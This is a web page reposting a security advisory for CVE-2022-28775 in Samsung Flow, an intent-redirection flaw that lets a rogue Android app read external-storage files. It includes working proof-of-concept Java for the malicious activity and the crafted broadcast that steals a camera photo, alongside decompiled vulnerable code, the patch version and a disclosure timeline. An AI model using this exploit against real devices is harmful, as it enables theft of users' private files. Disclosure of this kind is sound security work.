<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Samsung Flow File System Access | Malicious Erection LLC</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Samsung Flow File System Access" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Improper access control vulnerability in Samsung Flow prior to version 4.8.06.5 allows attacker to write the file without Samsung Flow permission." />
<meta property="og:description" content="Improper access control vulnerability in Samsung Flow prior to version 4.8.06.5 allows attacker to write the file without Samsung Flow permission." />
<link rel="canonical" href="https://maliciouserection.com/cves/2022-04-01_cve-2022-28775/" />
<meta property="og:url" content="https://maliciouserection.com/cves/2022-04-01_cve-2022-28775/" />
<meta property="og:site_name" content="Malicious Erection LLC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-04-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Samsung Flow File System Access" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-01T00:00:00+00:00","datePublished":"2022-04-01T00:00:00+00:00","description":"Improper access control vulnerability in Samsung Flow prior to version 4.8.06.5 allows attacker to write the file without Samsung Flow permission.","headline":"Samsung Flow File System Access","mainEntityOfPage":{"@type":"WebPage","@id":"https://maliciouserection.com/cves/2022-04-01_cve-2022-28775/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://maliciouserection.com/assets/images/logo.png"}},"url":"https://maliciouserection.com/cves/2022-04-01_cve-2022-28775/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link rel="stylesheet" href="/assets/css/main.css" />
  </head>

  <body class="flex flex-col h-screen antialiased">
    <div 
  class="flex-none bg-base-100 shadow-sm h-20 navbar"
  style="height: 10rem;"
>
  <div 
    class="flex-none navbar-start"
    style="height: 9rem;"
  >
    <div class="shadow-lg dropdown">
      <div tabindex="0" role="button" class="lg:hidden btn btn-ghost">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M4 6h16M4 12h8m-8 6h16"
          />
        </svg>
      </div>
      <ul
        tabindex="0"
        class="z-[1] space-y-5 bg-base-100 shadow mt-3 p-2 rounded-box w-72 menu menu-sm dropdown-content"
      >
        
        <li class="text-secondary text-lg">
          <a href="/">Home</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/blog">Blog</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/tools">Tools</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/cves">CVEs</a>
        </li>
        
      </ul>
    </div>
    <a 
      href="/" 
      title="Malicious Erection LLC" 
      class="px-5"
      style="height: 7rem;"
    >
      <img
        src="/assets/images/logo.png"
        alt="Malicious Erection LLC"
        class="w-32 object-center image-center"
        style="width: 15rem;"
      />
    </a>
  </div>
  <div class="hidden lg:flex flex-1 gap-3 navbar-end">
    <ul class="gap-3 px-1 menu menu-horizontal">
      
      <li class="font-semibold text-base">
        <a href="/">Home</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/blog">Blog</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/tools">Tools</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/cves">CVEs</a>
      </li>
      
    </ul>
  </div>
</div>

    <div class="flex-1 overflow-y-auto">
      <div class="min-h-[80vh]"><main>
  <!-- Header Section -->
  <section class="flex justify-center items-center bg-secondary/75 py-16">
    <h1 class="font-bold text-neutral-content text-5xl text-center">Samsung Flow File System Access</h1>
  </section>

  <!-- Content Section -->
  <section class="mx-auto py-10 text-neutral-content prose px-4 sm:px-6 lg:px-8 max-w-full lg:max-w-5xl xl:max-w-[1100px]">
    <h4 id="original-post-httpslabsf-securecomadvisoriessamsung-flow-any-app-can-read-the-external-storage">Original post: <a href="https://labs.f-secure.com/advisories/samsung-flow-any-app-can-read-the-external-storage/">https://labs.f-secure.com/advisories/samsung-flow-any-app-can-read-the-external-storage/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Samsung Flow prior to version 4.8.06.5</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>Medium</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2022-28775</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Security Control Bypass</td>
    </tr>
  </tbody>
</table>

<h2 id="description">Description</h2>

<p>F-Secure looked into exploiting the Samsung Galaxy S21 device for Austin Pwn2Own 2021. Samsung Flow, an application offered on the Galaxy Store, had an issue with how it handled broadcasted intents. A rogue application could use this issue to read contents on the device’s external storage without requiring the proper Android permissions.</p>

<h2 id="the-exploit">The Exploit</h2>

<p>As an example, the following exploit code will exfiltrate a picture taken by the device’s camera. This example requires two parts. First, the rogue application must contain an exported activity with the following Java code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class IntentProxyToContentProvider extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri uri = Uri.parse(getIntent().getDataString());
        try {
            Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri));
            String yayuriyay = MediaStore.Images.Media.insertImage(getContentResolver(),
                bitmap,
                "yaytitleyay",
                "yaydescriptionyay");
            InputStream input = getContentResolver().openInputStream(Uri.parse(yayuriyay));
            File file = new File(getFilesDir(), "yayoutputyay.jpg");
            FileOutputStream output = new FileOutputStream(file);
            try{
                byte[] buf = new byte[1024];
                int len;
                while ((len = input.read(buf)) &gt; 0) {
                    output.write(buf, 0, len);
                }
          } catch (Exception e) {
                e.printStackTrace();
          } finally {
                try {
                    if (input != null)
                    input.close();
                    if (output != null)
                    output.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (FileNotFoundException e) {
           e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
</code></pre></div></div>

<p>Second, the rogue application must send the following Broadcast, replacing “<target picture="">" with the name of the picture found on the device, and "<rogue application="" package="">" with the package name of the rogue application:</rogue></target></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent intent = new Intent();
intent.setComponent(new ComponentName("com.samsung.android.galaxycontinuity", "com.samsung.android.galaxycontinuity.manager.GlobalBroadcastReceiver"));
intent.setAction("com.samsung.android.galaxycontinuity.action.ACTION_FLOW_CONTENT_PENDING_INTENT"); 
Intent intent2 = new Intent();
intent2.setComponent(new ComponentName("&lt;rogue application package&gt;", " &lt;rogue application package&gt;.IntentProxyToContentProvider"));
intent2.setData(Uri.parse("content://com.samsung.android.galaxycontinuity.provider/external_files/DCIM/Camera/&lt;target picture name&gt;"));
intent2.setFlags(195);
Bundle bundle = new Bundle();
bundle.putParcelable("_data", intent2);
bundle.putString("ClassName", "com.samsung.android.galaxycontinuity.activities.ChooserDelegateActivity");
intent.putExtras(bundle); 
sendBroadcast(intent);
</code></pre></div></div>

<p>The above code will perform the following steps:</p>

<ul>
  <li>Send a Broadcast to the exported Broadcast Receiver <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.manager.GlobalBroadcastReceiver</code></li>
  <li>The Broadcast Receiver opens the unexported Activity <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.activities.ChooserDelegateActivity</code></li>
  <li>The Activity passes permissions to read the unexported Content File Provider <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.provider</code> to the rogue application’s exported Activity mentioned earlier</li>
  <li>After successful exploitation, the targeted picture will be saved to the rogue application’s “Files” private directory. Specifically, it will be saved to <code class="language-plaintext highlighter-rouge">/data/data/&lt;rogue application package&gt;/Files/yayoutputyay.jpg</code>.</li>
</ul>

<h2 id="technical-details">Technical Details</h2>

<p>The exported Broadcast Receiver <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.manager.GlobalBroadcastReceiver</code> processes received broadcast intents by checking for:</p>

<ul>
  <li>The action value</li>
  <li>The extra string value <code class="language-plaintext highlighter-rouge">ClassName</code></li>
</ul>

<p>If the action value matches <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.action.ACTION_FLOW_CONTENT_PENDING_INTENT</code> and <code class="language-plaintext highlighter-rouge">ClassName</code> is not null, then a new intent is created and Samsung Flow will start the activity defined in <code class="language-plaintext highlighter-rouge">ClassName</code>. Any intent extras that is bundled with the broadcast intent is also bundled with the newly created intent:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void onReceive(Context context, Intent intent) {
        Intent intent2;
        try {
            String action = intent.getAction();
            intent.setComponent(null);
            if (action.equals("REQUEST_LAUNCH_MY_FILES")) {
                FileUtil.openMyFiles(intent.getStringExtra("START_PATH"));
                return;
            }
            if (!"android.intent.action.BOOT_COMPLETED".equals(action)) {
                if (!ACTION_LAZY_BOOT_COMPLETE.equals(action)) {
                    if (Define.ACTION_FLOW_CONTENT_PENDING_INTENT.equals(action)) {
                        String stringExtra = intent.getStringExtra("ClassName");
                        if (stringExtra != null) {
                            if ((stringExtra.equals(NotificationDetailActivity.class.getName()) || stringExtra.equals(ChatActivity.class.getName())) &amp;&amp; SettingsManager.getInstance().getNotificationOption()) {
                                Intent intent3 = new Intent(SamsungFlowApplication.get(), MirroringActivity.class);
                                intent3.setAction(Define.ACTION_SMARTVIEW_FROM_NOTIFICATION);
                                intent3.putExtra("FlowKey", intent.getStringExtra("FlowKey"));
                                intent3.setFlags(268435456);
                                SamsungFlowApplication.get().startActivity(intent3);
                                return;
                            }
                            Intent intent4 = new Intent(SamsungFlowApplication.get(), Class.forName(stringExtra));
                            intent4.replaceExtras(intent.getExtras());
                            intent4.setFlags(268435456);
                            SamsungFlowApplication.get().startActivity(intent4);
                            return;
</code></pre></div></div>

<p>By defining <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.activities.ChooserDelegateActivity" as the "ClassName</code>, a Create Chooser Intent is created based on the data defined in the passed intent’s parcelable extra <code class="language-plaintext highlighter-rouge">_data</code>. The intent bundled in <code class="language-plaintext highlighter-rouge">_data</code> can contain standard intent objects, intent extras.</p>

<p>This new intent is started via startActivity:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        startChooser(getIntent());
        finish();
    }
private void startChooser(Intent intent) {
        if (intent != null &amp;&amp; intent.getExtras().containsKey("_data")) {
            try {
                ArrayList&lt;? extends Parcelable&gt; arrayList = new ArrayList&lt;&gt;();
                arrayList.add(new ComponentName(SamsungFlowApplication.get().getPackageName(), ShareActivity.class.getName()));
                Intent createChooser = Intent.createChooser((Intent) intent.getParcelableExtra("_data"), ResourceUtil.getString(R.string.share));
                if (Build.VERSION.SDK_INT &gt;= 24) {
                    createChooser.putExtra("android.intent.extra.EXCLUDE_COMPONENTS", (Parcelable[]) arrayList.toArray(new Parcelable[0]));
                } else {
                    createChooser.putParcelableArrayListExtra("extra_chooser_droplist", arrayList);
                }
                if (intent.getBooleanExtra(EXTRA_POP_OVER_SUPPORTED, false)) {
                    int intExtra = intent.getIntExtra(EXTRA_POP_OVER_POS, -1);
                    ActivityOptions makeBasic = ActivityOptions.makeBasic();
                    makeBasic.semSetChooserPopOverPosition(intExtra);
                    startActivity(createChooser, makeBasic.toBundle());
                    return;
                }
                startActivity(createChooser);
            } catch (Exception e) {
                FlowLog.e(e);
            }
        }
    }
</code></pre></div></div>

<p>If the Create Chooser Intent passed to <code class="language-plaintext highlighter-rouge">startActivity</code> contains the following flags, then the target started activity will be given access to Samsung Flow’s content providers, including unexported content providers:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</code></li>
  <li><code class="language-plaintext highlighter-rouge">Intent.FLAG_GRANT_PREFIX_URI_PERMISSION</code></li>
  <li><code class="language-plaintext highlighter-rouge">Intent.FLAG_GRANT_READ_URI_PERMISSION</code></li>
  <li><code class="language-plaintext highlighter-rouge">Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code></li>
</ul>

<p>As an example, an intent passed to <code class="language-plaintext highlighter-rouge">startActivity</code> could contain a data value of <code class="language-plaintext highlighter-rouge">content://com.samsung.android.galaxycontinuity.provider/external_files/DCIM/Camera/&lt;target picture&gt;</code>. Then the target activity will be given access to the content provider <code class="language-plaintext highlighter-rouge">com.samsung.android.galaxycontinuity.provider</code> and be able to download the file <code class="language-plaintext highlighter-rouge">/external_files/DCIM/Camera/&lt;target picture&gt;</code>. The following code within the target activity can be used to create a new file via the Android MediaStore content provider, and save the data that was obtained from <code class="language-plaintext highlighter-rouge">content://com.samsung.android.galaxycontinuity.provider/external_files/DCIM/Camera/&lt;target picture&gt;</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Uri uri = Uri.parse(getIntent().getDataString());
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri));
String yayuriyay = MediaStore.Images.Media.insertImage(getContentResolver(), bitmap, "yaytitleyay", "yaydescriptionyay");
Lod.d("yaytagyay", "this content provider contains the saved media: " + yayuriyay);
</code></pre></div></div>

<h2 id="remedial-action">Remedial Action</h2>

<p>Samsung has released Samsung Flow version 4.8.06.5 which addresses this issue. Users should update their Samsung Flow application to the latest version available.</p>

<h2 id="credits">Credits</h2>

<p>This issue was discovered by Ken Gannon.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>19/10/2021</td>
      <td>Issue disclosed to Samsung Mobile Security</td>
    </tr>
    <tr>
      <td>19/10/2021</td>
      <td>Issue assigned to a Samsung Security Analyst</td>
    </tr>
    <tr>
      <td>02/01/2022</td>
      <td>Samsung confirms the vulnerability and rates it as a critical risk issue</td>
    </tr>
    <tr>
      <td>04/03/2022</td>
      <td>Patch released, Samsung initiates process for bug bounty reward</td>
    </tr>
    <tr>
      <td>12/04/2022</td>
      <td>CVE Assigned</td>
    </tr>
    <tr>
      <td>04/05/2022</td>
      <td>Advisory Published</td>
    </tr>
  </tbody>
</table>

  </section>

  <!-- CTA Button (optional) -->
  
</main>
</div>
      <div class="bg-neutral-800">
  <footer class="mx-auto py-10 container">
    <div class="flex flex-wrap justify-center gap-3 mb-10 align-center">
      
      <a href="/" class="btn btn-secondary btn-ghost"
        >Home</a
      >
      
      <a href="/blog/" class="btn btn-secondary btn-ghost"
        >Blog</a
      >
      
      <a href="/tools" class="btn btn-secondary btn-ghost"
        >Tools</a
      >
      
      <a href="/vulnerability-disclosure-policy" class="btn btn-secondary btn-ghost"
        >Vulnerability Disclosure Policy</a
      >
      
      <a href="/cves/" class="btn btn-secondary btn-ghost"
        >CVEs</a
      >
      
    </div>
    <div class="flex justify-center items-center gap-3 mb-10">
      
      <a
        title="Github"
        href="https://github.com/MaliciousErection"
        class="btn btn-ghost btn-circle"
      >
        <i class="fa fa-github text-xl"></i>
      </a>
      
    </div>
    <p class="text-center">© 2025 Malicious Erection LLC.</p>
  </footer>
</div>

    </div>
  </body>
</html>
